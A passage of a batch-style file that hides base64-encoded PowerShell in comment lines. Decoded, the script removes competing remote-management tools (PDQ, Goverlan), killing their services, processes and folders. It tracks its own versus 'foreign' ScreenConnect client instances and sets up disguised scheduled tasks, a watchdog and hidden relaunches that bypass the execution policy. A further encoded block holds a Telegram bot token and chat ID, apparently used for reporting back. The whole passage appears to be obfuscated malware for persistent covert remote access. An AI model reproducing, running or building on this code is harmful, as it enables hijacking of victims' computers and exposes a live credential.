::c1xHb3ZlcmxhbiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxHb3ZlcmxhbiIp
::OyBQcm9kPUAoJ0dvdmVybGFuKicpIH0NCiAgICAgICAgQHsgVGFnPSdQRFEnOyAg
::ICAgICAgICBTdmM9QCgnUERRKicpOyBQcm9jPUAoJ1BEUVJ1bm5lcionLCdQRFFJ
::bnZlbnRvcnkqJywnUERRRGVwbG95KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
::bGVzXEFkbWluIEFyc2VuYWwiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQWRt
::aW4gQXJzZW5hbCIsIiRlbnY6UHJvZ3JhbUZpbGVzXFBEUSIsIiR7ZW52OlByb2dy
::YW1GaWxlcyh4ODYpfVxQRFEiKTsgUHJvZD1AKCdQRFEgRGVwbG95KicsJ1BEUSBJ
::bnZlbnRvcnkqJywnUERRIENvbm5lY3QqJykgfQ0KICAgICkNCg0KICAgIGZvcmVh
::Y2ggKCR0b29sIGluICRybW0pIHsNCiAgICAgICAgJGhpdCA9ICRmYWxzZQ0KICAg
::ICAgICBmb3JlYWNoICgkcGF0IGluICR0b29sLlByb2QpIHsNCiAgICAgICAgICAg
::IGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsNCiAg
::ICAgICAgICAgICAgICBHZXQtQ2hpbGRJdGVtICRyb290IC1FcnJvckFjdGlvbiBT
::aWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAg
::ICAgICAgICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1BhdGggLUVycm9y
::QWN0aW9uIFNpbGVudGx5Q29udGludWUpLkRpc3BsYXlOYW1lDQogICAgICAgICAg
::ICAgICAgICAgIGlmICgkZG4gLWFuZCAkZG4gLWxpa2UgJHBhdCkgew0KICAgICAg
::ICAgICAgICAgICAgICAgICAgaWYgKElzLURhdHRvS2VlcGVyICRkbikgeyBMb2cg
::InJtbV9za2lwX2RhdHRvX2tlZXAgWyRkbl0iOyByZXR1cm4gfQ0KICAgICAgICAg
::ICAgICAgICAgICAgICAgaWYgKFVuaW5zdGFsbC1Qcm9kdWN0S2V5ICRfKSB7ICRu
::LnJtbSsrOyAkaGl0ID0gJHRydWUgfQ0KICAgICAgICAgICAgICAgICAgICB9DQog
::ICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAg
::ICAgIGZvcmVhY2ggKCRwYXQgaW4gJHRvb2wuU3ZjKSB7DQogICAgICAgICAgICBH
::ZXQtU2VydmljZSAtTmFtZSAkcGF0IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
::bnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgICAgIGlmIChJcy1E
::YXR0b0tlZXBlciAkXy5OYW1lIC1vciBJcy1EYXR0b0tlZXBlciAkXy5EaXNwbGF5
::TmFtZSkgeyBMb2cgInJtbV9za2lwX2RhdHRvX3N2YyAkKCRfLk5hbWUpIjsgcmV0
::dXJuIH0NCiAgICAgICAgICAgICAgICAmIHNjLmV4ZSBzdG9wICIkKCRfLk5hbWUp
::IiAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAt
::TWlsbGlzZWNvbmRzIDUwMA0KICAgICAgICAgICAgICAgICYgc2MuZXhlIGRlbGV0
::ZSAiJCgkXy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAg
::JG4ucm1tKys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1fc3ZjX2RlbGV0ZWQgJCgk
::Xy5OYW1lKSBbJCgkdG9vbC5UYWcpXSINCiAgICAgICAgICAgIH0NCiAgICAgICAg
::fQ0KICAgICAgICBmb3JlYWNoICgkcGF0IGluICR0b29sLlByb2MpIHsNCiAgICAg
::ICAgICAgIEdldC1Qcm9jZXNzIC1OYW1lICRwYXQgLUVycm9yQWN0aW9uIFNpbGVu
::dGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAgICAg
::U3RvcC1Qcm9jZXNzIC1JZCAkXy5JZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVu
::dGx5Q29udGludWUNCiAgICAgICAgICAgICAgICAkbi5ybW0rKzsgJGhpdCA9ICR0
::cnVlOyBMb2cgInJtbV9wcm9jX2tpbGxlZCAkKCRfLlByb2Nlc3NOYW1lKSBbJCgk
::dG9vbC5UYWcpXSINCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBm
::b3JlYWNoICgkZCBpbiAkdG9vbC5EaXJzKSB7DQogICAgICAgICAgICBpZiAoJGQg
::LWFuZCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkpIHsNCiAgICAgICAgICAg
::ICAgICBpZiAoSXMtRGF0dG9LZWVwZXIgJGQpIHsgTG9nICJybW1fc2tpcF9kYXR0
::b19kaXIgJGQiOyBjb250aW51ZSB9DQogICAgICAgICAgICAgICAgaWYgKEZvcmNl
::LVJlbW92ZURpciAkZCkgeyAkbi5ybW0rKzsgJGhpdCA9ICR0cnVlOyBMb2cgInJt
::bV9kaXJfcmVtb3ZlZCAkZCIgfQ0KICAgICAgICAgICAgICAgIGVsc2UgeyAkbi5m
::YWlsKys7IExvZyAicm1tX2Rpcl9SRU1PVkVfRkFJTEVEICRkIiB9DQogICAgICAg
::ICAgICB9DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRoaXQpIHsgTG9nICJybW1f
::ZXh0ZXJtaW5hdGVkICQoJHRvb2wuVGFnKSIgfQ0KICAgIH0NCg0KICAgICRzdW1t
::YXJ5ID0gImV4dGVybWluYXRlIHN2Yz0kKCRuLnN2YykgcHJvYz0kKCRuLnByb2Mp
::IGRpcj0kKCRuLmRpcikgcHJvZHVjdD0kKCRuLnByb2R1Y3QpIHJtbT0kKCRuLnJt
::bSkgZmFpbD0kKCRuLmZhaWwpIg0KICAgIExvZyAkc3VtbWFyeQ0KICAgIHJldHVy
::biAkc3VtbWFyeQ0KfQ0KDQpmdW5jdGlvbiBVcGRhdGUtU3RhdGUgew0KICAgICRr
::ZWVwID0gQChHZXQtS2VlcEZpbmdlcnByaW50cykNCiAgICAkZ3J5eGFGcCA9IEdl
::dC1Hcnl4YUZwDQogICAgJHNldnJ6ID0gQChHZXQtU2V2cnpLZWVwKQ0KICAgICRw
::cmltRnAgPSAkc2V2cnpbMF07ICRhbHRGcCA9ICRzZXZyelsxXQ0KICAgICRwcmlt
::ID0gJG51bGw7ICRhbHQgPSAkbnVsbDsgJHNjcmlwdDpncnl4YSA9ICRudWxsDQog
::ICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLU5hbWUgJ1NjcmVlbkNv
::bm5lY3QgQ2xpZW50KicpKSB7DQogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNo
::ICdcKChbMC05YS1mXXsxNn0pXCknKSB7DQogICAgICAgICAgICAkZnAgPSAkbWF0
::Y2hlc1sxXS5Ub0xvd2VyKCkNCiAgICAgICAgICAgIGlmICgkZnAgLWVxICRwcmlt
::RnApIHsgJHByaW0gPSAiJCgkc3ZjLlN0YXR1cykiIH0NCiAgICAgICAgICAgIGVs
::c2VpZiAoJGZwIC1lcSAkYWx0RnApIHsgJGFsdCA9ICIkKCRzdmMuU3RhdHVzKSIg
::fQ0KICAgICAgICAgICAgZWxzZWlmICgkZnAgLWVxICRncnl4YUZwIC1vciAoVGVz
::dC1Jc0dyeXhhRnAgJGZwKSkgeyAkc2NyaXB0OmdyeXhhID0gIiQoJHN2Yy5TdGF0
::dXMpIiB9DQogICAgICAgIH0NCiAgICB9DQogICAgJGZvcmVpZ24gPSBAKCkNCiAg
::ICBmb3JlYWNoICgkc3ZjIGluIChHZXQtU2VydmljZSAtTmFtZSAnU2NyZWVuQ29u
::bmVjdCBDbGllbnQqJykpIHsNCiAgICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2gg
::J1woKFswLTlhLWZdezE2fSlcKScgLWFuZCAkbWF0Y2hlc1sxXSAtbm90aW4gJGtl
::ZXApIHsNCiAgICAgICAgICAgICRmb3JlaWduICs9ICRtYXRjaGVzWzFdDQogICAg
::ICAgIH0NCiAgICB9DQogICAgJGlkID0gUmVhZC1JZGVudGl0eQ0KICAgICR0YXNr
::c09rID0gMDsgJHRhc2tzVG90YWwgPSAwDQogICAgZm9yZWFjaCAoJGsgaW4gJ1RB
::U0tfQScsJ1RBU0tfQicsJ1RBU0tfQycsJ1RBU0tfRCcpIHsNCiAgICAgICAgJHRh
::c2tzVG90YWwrKw0KICAgICAgICAkdG4gPSBOb3JtYWxpemUtVGFza05hbWUgKFtz
::dHJpbmddJGlkWyRrXSkNCiAgICAgICAgaWYgKC1ub3QgJHRuKSB7IGNvbnRpbnVl
::IH0NCiAgICAgICAgJG1hcmtlciA9IGlmICgkayAtZXEgJ1RBU0tfQicpIHsgJ2V0
::bF9tb24uY21kJyB9IGVsc2UgeyAnb3duX21vbi5jbWQnIH0NCiAgICAgICAgaWYg
::KChUZXN0LVRhc2tPd25zTW9uICR0biAkbWFya2VyKSAtb3IgKFRlc3QtVGFza093
::bnNNb24gKCJcJHRuIikgJG1hcmtlcikpIHsgJHRhc2tzT2srKyB9DQogICAgfQ0K
::ICAgICMgTDM5OiBjb3VudCBXdWNhY2hlR3J5eGFCb290IChUQVNLX0cpDQogICAg
::JHRhc2tzVG90YWwrKw0KICAgICR0Z05hbWUgPSAnV3VjYWNoZUdyeXhhQm9vdCcN
::CiAgICBpZiAoKEdldC1TY2hlZHVsZWRUYXNrIC1UYXNrTmFtZSAkdGdOYW1lIC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSAtb3INCiAgICAgICAgKFRlc3Qt
::UGF0aCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAnZ3J5eGFfYm9v
::dC5jbWQnKSkpIHsNCiAgICAgICAgJHRhc2tzT2srKw0KICAgIH0NCiAgICBpZiAo
::LW5vdCAkTW9uUGF0aCkgeyAkTW9uUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAn
::b3duX21vbi5jbWQnIH0NCiAgICAkd2QgPSBFbnN1cmUtV2F0Y2hkb2cNCiAgICAk
::cHJldiA9IEB7fQ0KICAgICRzdGF0ZVBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIg
::J3N0YXRlLmpzb24nDQogICAgaWYgKFRlc3QtUGF0aCAkc3RhdGVQYXRoKSB7DQog
::ICAgICAgIHRyeSB7IChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0
::aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbikuUFNPYmplY3QuUHJvcGVydGllcyB8
::IEZvckVhY2gtT2JqZWN0IHsgJHByZXZbJF8uTmFtZV0gPSAkXy5WYWx1ZSB9IH0g
::Y2F0Y2gge30NCiAgICB9DQogICAgJGluc3RhbGxDb3VudCA9IDENCiAgICBpZiAo
::JHByZXYuaW5zdGFsbENvdW50KSB7ICRpbnN0YWxsQ291bnQgPSBbaW50XSRwcmV2
::Lmluc3RhbGxDb3VudCB9DQogICAgaWYgKCRwcmV2LnByaW0gLWFuZCAkcHJldi5w
::cmltIC1uZSAnUnVubmluZycgLWFuZCAkcHJpbSAtZXEgJ1J1bm5pbmcnKSB7ICRp
::bnN0YWxsQ291bnQrKyB9DQogICAgJHN0YXRlID0gW29yZGVyZWRdQHsNCiAgICAg
::ICAgaG9zdCAgICAgICAgID0gJGVudjpDT01QVVRFUk5BTUUNCiAgICAgICAgdHMg
::ICAgICAgICAgID0gKEdldC1EYXRlKS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmlu
::ZygnbycpDQogICAgICAgIGJ1aWxkICAgICAgICA9ICRCdWlsZA0KICAgICAgICBw
::cmltICAgICAgICAgPSAkKGlmICgkcHJpbSkgeyAkcHJpbSB9IGVsc2UgeyAnTUlT
::U0lORycgfSkNCiAgICAgICAgYWx0ICAgICAgICAgID0gJChpZiAoJGFsdCkgeyAk
::YWx0IH0gZWxzZSB7ICdNSVNTSU5HJyB9KQ0KICAgICAgICBncnl4YSAgICAgICAg
::PSAkKGlmICgkc2NyaXB0OmdyeXhhKSB7ICRzY3JpcHQ6Z3J5eGEgfSBlbHNlIHsg
::J01JU1NJTkcnIH0pDQogICAgICAgIGdyeXhhRnAgICAgICA9ICRncnl4YUZwDQog
::ICAgICAgIGZvcmVpZ24gICAgICA9ICRmb3JlaWduDQogICAgICAgIHRhc2tzT2sg
::ICAgICA9ICR0YXNrc09rDQogICAgICAgIHRhc2tzVG90YWwgICA9ICR0YXNrc1Rv
::dGFsDQogICAgICAgIHdhdGNoZG9nICAgICA9ICR3ZA0KICAgICAgICBpbnN0YWxs
::Q291bnQgPSAkaW5zdGFsbENvdW50DQogICAgICAgIGxhc3RIZWFsICAgICA9ICQo
::aWYgKCRFeHRyYSkgeyAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3Ry
::aW5nKCdvJykgfSBlbHNlaWYgKCRwcmV2Lmxhc3RIZWFsKSB7ICRwcmV2Lmxhc3RI
::ZWFsIH0gZWxzZSB7ICRudWxsIH0pDQogICAgICAgIG5vdGUgICAgICAgICA9ICRF
::eHRyYQ0KICAgIH0NCiAgICAoJHN0YXRlIHwgQ29udmVydFRvLUpzb24gLUNvbXBy
::ZXNzKSB8IFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoIC1Gb3Jj
::ZQ0KICAgIHJldHVybiAkc3RhdGUNCn0NCg0Kc3dpdGNoICgkQWN0aW9uKSB7DQog
::ICAgJ2luaXQnICAgICAgICAgICAgeyAkaWQgPSBJbml0aWFsaXplLUlkZW50aXR5
::OyAkaWQuR2V0RW51bWVyYXRvcigpIHwgRm9yRWFjaC1PYmplY3QgeyAiJCgkXy5L
::ZXkpPSQoJF8uVmFsdWUpIiB9IH0NCiAgICAnaWRlbnRpdHknICAgICAgICB7ICRp
::ZCA9IFJlYWQtSWRlbnRpdHk7ICRpZC5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNo
::LU9iamVjdCB7ICIkKCRfLktleSk9JCgkXy5WYWx1ZSkiIH0gfQ0KICAgICd3YXRj
::aGRvZycgICAgICAgIHsgSW5zdGFsbC1XYXRjaGRvZyB8IE91dC1OdWxsIH0NCiAg
::ICAnd2F0Y2hkb2ctZW5zdXJlJyB7IEVuc3VyZS1XYXRjaGRvZyB9DQogICAgJ3Rh
::c2tzLWVuc3VyZScgICAgeyBFbnN1cmUtUGVyc2lzdFRhc2tzIH0NCiAgICAnc3Rh
::dGUnICAgICAgICAgICB7IFVwZGF0ZS1TdGF0ZSB8IENvbnZlcnRUby1Kc29uIC1D
::b21wcmVzcyB9DQogICAgJ3JlcGFpcicgICAgICAgICAgeyBSZXBhaXItU0NTZXJ2
::aWNlICRGcCB9DQogICAgJ3JlZ2lzdGVyZWQnICAgICAgeyBUZXN0LVNDUmVnaXN0
::ZXJlZCAkRnAgfQ0KICAgICdleHRlcm1pbmF0ZScgICAgIHsgSW52b2tlLUV4dGVy
::bWluYXRlIH0NCiAgICAnZ3J5eGEtaGVhbHRoJyAgICB7IFRlc3QtR3J5eGFIZWFs
::dGggfQ0KICAgICdzeW5jLWdyeXhhLWZwJyAgIHsNCiAgICAgICAgJGcgPSBGaW5k
::LVJ1bm5pbmdHcnl4YUZwDQogICAgICAgIGlmICgkZykgew0KICAgICAgICAgICAg
::U2V0LUdyeXhhRnAgJGcNCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiU1lOQ0VE
::fCRnIg0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJGN1ciA9IEdldC1H
::cnl4YUZwDQogICAgICAgICAgICBpZiAoLW5vdCAoVGVzdC1Jc0dyeXhhRnAgJGN1
::cikgLWFuZCAkc2NyaXB0OkdyeXhhRXhwZWN0ZWRGcCkgew0KICAgICAgICAgICAg
::ICAgIFNldC1Hcnl4YUZwICRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZwDQogICAgICAg
::ICAgICAgICAgV3JpdGUtT3V0cHV0ICJSRVNFVHwkKCRzY3JpcHQ6R3J5eGFFeHBl
::Y3RlZEZwKSINCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAg
::V3JpdGUtT3V0cHV0ICJOT05FfCRjdXIiDQogICAgICAgICAgICB9DQogICAgICAg
::IH0NCiAgICB9DQogICAgJ3Rlc3QtbXNpJyAgICAgICAgew0KICAgICAgICAkcGF0
::aCA9ICRFeHRyYQ0KICAgICAgICBpZiAoLW5vdCAkcGF0aCkgeyBXcml0ZS1PdXRw
::dXQgJ25vJzsgYnJlYWsgfQ0KICAgICAgICBpZiAoVGVzdC1Nc2lQYWNrYWdlICRw
::YXRoICRGcCkgeyBXcml0ZS1PdXRwdXQgJ3llcycgfSBlbHNlIHsgV3JpdGUtT3V0
::cHV0ICdubycgfQ0KICAgIH0NCiAgICAncHJvdGVjdC1tc2knICAgICB7DQogICAg
::ICAgICRzYWZlID0gUHJvdGVjdC1Nc2lTaWJsaW5nU2FmZSAkRXh0cmENCiAgICAg
::ICAgaWYgKCRzYWZlKSB7IFdyaXRlLU91dHB1dCAkc2FmZSB9IGVsc2UgeyBXcml0
::ZS1PdXRwdXQgJ0ZBSUwnIH0NCiAgICB9DQogICAgJ3ZlcmlmeS11cGRhdGUnICAg
::ew0KICAgICAgICAjIEV4dHJhID0gIm1hbmlmZXN0fHNpZ3xuYW1lPXBhdGg7bmFt
::ZTI9cGF0aDIiDQogICAgICAgICRwYXJ0cyA9ICRFeHRyYSAtc3BsaXQgJ1x8Jywg
::Mw0KICAgICAgICBpZiAoJHBhcnRzLkNvdW50IC1sdCAzKSB7IFdyaXRlLU91dHB1
::dCAnYmFkLWFyZ3MnOyBicmVhayB9DQogICAgICAgICRtYXAgPSBAe30NCiAgICAg
::ICAgZm9yZWFjaCAoJHBhaXIgaW4gKCRwYXJ0c1syXSAtc3BsaXQgJzsnKSkgew0K
::ICAgICAgICAgICAgaWYgKCRwYWlyIC1tYXRjaCAnXihbXj1dKyk9KC4qKSQnKSB7
::ICRtYXBbJG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0gfQ0KICAgICAgICB9DQog
::ICAgICAgIFdyaXRlLU91dHB1dCAoVGVzdC1VcGRhdGVNYW5pZmVzdCAkcGFydHNb
::MF0gJHBhcnRzWzFdICRtYXApDQogICAgfQ0KICAgICdzeW5jLXNldnJ6LWZwJyAg
::IHsNCiAgICAgICAgaWYgKCRFeHRyYSkgeyBXcml0ZS1PdXRwdXQgKFN5bmMtU2V2
::cnpFeHBlY3RlZCAkRXh0cmEpIH0NCiAgICAgICAgZWxzZSB7DQogICAgICAgICAg
::ICAkayA9IEAoR2V0LVNldnJ6S2VlcCkNCiAgICAgICAgICAgIFdyaXRlLU91dHB1
::dCAoIlNFVlJafCQoJGtbMF0pfCQoJGtbMV0pIikNCiAgICAgICAgfQ0KICAgIH0N
::CiAgICAnZ3J5eGEtZW5zdXJlJyAgICB7DQogICAgICAgIGlmICgkTm9XYWl0KSB7
::DQogICAgICAgICAgICAjIEwzNS9MMzk6IHBhc3MgQXJndW1lbnRMaXN0IGFzIHN0
::cmluZyBhcnJheSAoam9pbmVkIHN0cmluZyBpcyBhIFN0YXJ0LVByb2Nlc3MgZm9v
::dGd1bikNCiAgICAgICAgICAgICRwcyA9IChHZXQtUHJvY2VzcyAtSWQgJFBJRCku
::UGF0aA0KICAgICAgICAgICAgaWYgKC1ub3QgJHBzKSB7ICRwcyA9ICdwb3dlcnNo
::ZWxsLmV4ZScgfQ0KICAgICAgICAgICAgJGFyZ0xpc3QgPSBAKA0KICAgICAgICAg
::ICAgICAgICctTm9Qcm9maWxlJywgJy1FeGVjdXRpb25Qb2xpY3knLCAnQnlwYXNz
::JywNCiAgICAgICAgICAgICAgICAnLUZpbGUnLCAkUFNDb21tYW5kUGF0aCwNCiAg
::ICAgICAgICAgICAgICAnLUFjdGlvbicsICdncnl4YS1lbnN1cmUnLA0KICAgICAg
::ICAgICAgICAgICctV29ya0RpcicsICRXb3JrRGlyLA0KICAgICAgICAgICAgICAg
::ICctQnVpbGQnLCAkQnVpbGQNCiAgICAgICAgICAgICkNCiAgICAgICAgICAgIGlm
::ICgkRGVlcCkgIHsgJGFyZ0xpc3QgKz0gJy1EZWVwJyB9DQogICAgICAgICAgICBp
::ZiAoJEZvcmNlKSB7ICRhcmdMaXN0ICs9ICctRm9yY2UnIH0NCiAgICAgICAgICAg
::IFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRwcyAtQXJndW1lbnRMaXN0ICRhcmdM
::aXN0IC1XaW5kb3dTdHlsZSBIaWRkZW4NCiAgICAgICAgICAgIFdyaXRlLU91dHB1
::dCAnUVVFVUVEfGRldGFjaGVkPTEnDQogICAgICAgIH0gZWxzZSB7DQogICAgICAg
::ICAgICBXcml0ZS1PdXRwdXQgKEludm9rZS1Hcnl4YUVuc3VyZSB8IE91dC1TdHJp
::bmcpLlRyaW0oKQ0KICAgICAgICB9DQogICAgfQ0KfQ0K
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcK
Q0hBVF9JRD03NTQ3NDYyMDcwCg==
::B64_NTF_END
